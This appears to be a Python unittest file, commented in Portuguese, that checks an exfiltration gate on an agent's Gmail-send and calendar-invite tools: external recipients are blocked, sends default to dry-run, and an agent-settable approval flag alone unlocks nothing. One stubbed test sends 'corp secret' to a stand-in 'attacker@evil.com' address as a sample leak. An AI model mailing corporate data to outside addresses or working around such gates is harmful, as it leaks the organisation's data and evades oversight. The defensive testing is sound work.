"""
Testes de WIRING dos CANAIS IRMÃOS do P0 de exfiltração — gmail.send_email e
calendar_events.create_event. Mesmo vetor do drive.share: enviar email ou
convidar attendee externo tambem exfiltra dado corporativo para fora.

Mesma restrição do test_drive_share_gate: o python3 do sistema (3.9.6) NAO tem
googleapiclient. Injetamos STUBS em sys.modules ANTES de importar gmail/calendar.
O stub de auth conta quantas vezes a API real seria chamada.

Prova, sem rede nem credencial:
  - destinatario/attendee externo (vetor de exfiltracao) → 0 chamadas de API
  - PERMITIDO porem dry-run (default seguro)             → 0 chamadas de API
  - PERMITIDO + gate de dupla-env aberto                 → exatamente 1 chamada
"""
import os
import sys
import types
import unittest

SCRIPTS = os.path.join(os.path.dirname(__file__), "..", "scripts")
if SCRIPTS not in sys.path:
    sys.path.insert(0, SCRIPTS)

import _share_policy  # puro, importavel direto


# ─────────────────────── testes puros de evaluate_recipients ───────────────────────

class EvaluateRecipientsTestCase(unittest.TestCase):
    def setUp(self):
        for k in ("GOOGLE_WORKSPACE_SHARE_ALLOWED_DOMAINS", "GOOGLE_WORKSPACE_EXTERNAL_ALLOWED_DOMAINS"):
            os.environ.pop(k, None)

    def test_internal_recipients_permitted(self):
        v = _share_policy.evaluate_recipients("alguem@axtroai.com,outro@axtroai.com")
        self.assertEqual(v["decision"], "PERMITIDO")
        self.assertEqual(v["external"], [])

    def test_external_recipient_blocked_by_default(self):
        v = _share_policy.evaluate_recipients("alguem@axtroai.com,cliente@gmail.com")
        self.assertEqual(v["decision"], "BLOQUEADO")
        self.assertIn("cliente@gmail.com", v["external"])

    def test_external_with_approve_but_no_partner_allowlist_still_blocked(self):
        # approve_external sozinho (setavel pelo agente) NAO libera dominio arbitrario.
        v = _share_policy.evaluate_recipients("cliente@gmail.com", approve_external=True)
        self.assertEqual(v["decision"], "BLOQUEADO")

    def test_external_with_approve_and_partner_allowlist_permitted(self):
        os.environ["GOOGLE_WORKSPACE_EXTERNAL_ALLOWED_DOMAINS"] = "parceiro.com"
        v = _share_policy.evaluate_recipients("contato@parceiro.com", approve_external=True)
        self.assertEqual(v["decision"], "PERMITIDO")

    def test_invalid_recipient_blocked(self):
        v = _share_policy.evaluate_recipients("naoehemail")
        self.assertEqual(v["decision"], "BLOQUEADO")
        self.assertIn("naoehemail", v["invalid"])

    def test_empty_recipients_blocked(self):
        self.assertEqual(_share_policy.evaluate_recipients("")["decision"], "BLOQUEADO")
        self.assertEqual(_share_policy.evaluate_recipients([])["decision"], "BLOQUEADO")

    def test_list_and_csv_forms_equivalent(self):
        a = _share_policy.evaluate_recipients("x@axtroai.com,y@axtroai.com")
        b = _share_policy.evaluate_recipients(["x@axtroai.com", "y@axtroai.com"])
        self.assertEqual(a["decision"], b["decision"])


# ─────────────────────── wiring: gmail e calendar via stub ───────────────────────

_GATE_ENVS = ("HERMES_ALLOW_EXECUTE", "GOOGLE_WORKSPACE_AXTRO_ENABLED",
              "GOOGLE_WORKSPACE_EXTERNAL_ALLOWED_DOMAINS",
              "GOOGLE_WORKSPACE_SHARE_ALLOWED_DOMAINS")


class _Recorder(dict):
    pass


def _fake_send_client(recorder):
    class _Exec:
        def execute(self):
            recorder["api_calls"] += 1
            return {"id": "msg_fake", "threadId": "t_fake"}

    class _Messages:
        def send(self, **kw):
            recorder["last_kwargs"] = kw
            return _Exec()

    class _Users:
        def messages(self):
            return _Messages()

    class _Gmail:
        def users(self):
            return _Users()
    return _Gmail()


def _fake_calendar_client(recorder):
    class _Exec:
        def execute(self):
            recorder["api_calls"] += 1
            return {"id": "ev_fake", "summary": "x", "htmlLink": "http://x"}

    class _Events:
        def insert(self, **kw):
            recorder["last_kwargs"] = kw
            return _Exec()

    class _Cal:
        def events(self):
            return _Events()
    return _Cal()


class _WiringBase(unittest.TestCase):
    module_name = None

    def setUp(self):
        self.recorder = _Recorder(api_calls=0, last_kwargs=None)
        self._saved_mods = {k: sys.modules.get(k) for k in ("auth", self.module_name)}
        self._saved_env = {k: os.environ.get(k) for k in _GATE_ENVS}
        for k in _GATE_ENVS:
            os.environ.pop(k, None)
        fake_auth = types.ModuleType("auth")
        fake_auth.gmail = lambda: _fake_send_client(self.recorder)
        fake_auth.calendar = lambda: _fake_calendar_client(self.recorder)
        sys.modules["auth"] = fake_auth
        sys.modules.pop(self.module_name, None)

    def _enable(self):
        os.environ["HERMES_ALLOW_EXECUTE"] = "true"
        os.environ["GOOGLE_WORKSPACE_AXTRO_ENABLED"] = "true"

    def tearDown(self):
        for k, v in self._saved_mods.items():
            if v is None:
                sys.modules.pop(k, None)
            else:
                sys.modules[k] = v
        for k, v in self._saved_env.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v


class GmailSendGateTestCase(_WiringBase):
    module_name = "gmail"

    def test_external_recipient_never_calls_api(self):
        import gmail
        out = gmail.send_email("cliente@gmail.com", "s", "b", dry_run=False)
        self.assertTrue(out["blocked"])
        self.assertEqual(self.recorder["api_calls"], 0)

    def test_internal_dry_run_never_calls_api(self):
        import gmail
        out = gmail.send_email("colega@axtroai.com", "s", "b", dry_run=True)
        self.assertTrue(out["dry_run"])
        self.assertEqual(self.recorder["api_calls"], 0)

    def test_internal_library_call_without_env_stays_dry(self):
        # via biblioteca, sem as envs → gate fecha, 0 chamadas (fecha o Bypass B)
        import gmail
        out = gmail.send_email("colega@axtroai.com", "s", "b", dry_run=False)
        self.assertTrue(out.get("gate_blocked"))
        self.assertEqual(self.recorder["api_calls"], 0)

    def test_internal_permitted_with_gate_calls_api_once(self):
        self._enable()
        import gmail
        out = gmail.send_email("colega@axtroai.com", "s", "b", dry_run=False)
        self.assertTrue(out["sent"])
        self.assertEqual(self.recorder["api_calls"], 1)

    def test_external_never_sends_even_with_gate_open(self):
        self._enable()
        import gmail
        out = gmail.send_email("attacker@evil.com", "leak", "corp secret", dry_run=False)
        self.assertTrue(out["blocked"])
        self.assertEqual(self.recorder["api_calls"], 0)


class CalendarCreateGateTestCase(_WiringBase):
    module_name = "calendar_events"

    def test_external_attendee_never_calls_api(self):
        import calendar_events
        out = calendar_events.create_event(
            "reuniao", "2026-08-01T10:00:00", "2026-08-01T11:00:00",
            attendees=["externo@gmail.com"], dry_run=False)
        self.assertTrue(out["blocked"])
        self.assertEqual(self.recorder["api_calls"], 0)

    def test_internal_permitted_with_gate_calls_api_once(self):
        self._enable()
        import calendar_events
        out = calendar_events.create_event(
            "reuniao", "2026-08-01T10:00:00", "2026-08-01T11:00:00",
            attendees=["colega@axtroai.com"], dry_run=False)
        self.assertEqual(self.recorder["api_calls"], 1)

    def test_no_attendees_still_respects_dry_run_gate(self):
        # sem attendees não há destinatário externo, mas criar evento é mutação:
        # o gate de execução (dry-run default) vale mesmo assim — 0 chamadas de API.
        import calendar_events
        out = calendar_events.create_event(
            "so eu", "2026-08-01T10:00:00", "2026-08-01T11:00:00", dry_run=True)
        self.assertTrue(out["dry_run"])
        self.assertEqual(self.recorder["api_calls"], 0)

    def test_no_attendees_library_call_without_env_stays_dry(self):
        import calendar_events
        out = calendar_events.create_event(
            "so eu", "2026-08-01T10:00:00", "2026-08-01T11:00:00", dry_run=False)
        self.assertTrue(out.get("gate_blocked"))
        self.assertEqual(self.recorder["api_calls"], 0)


if __name__ == "__main__":
    unittest.main()
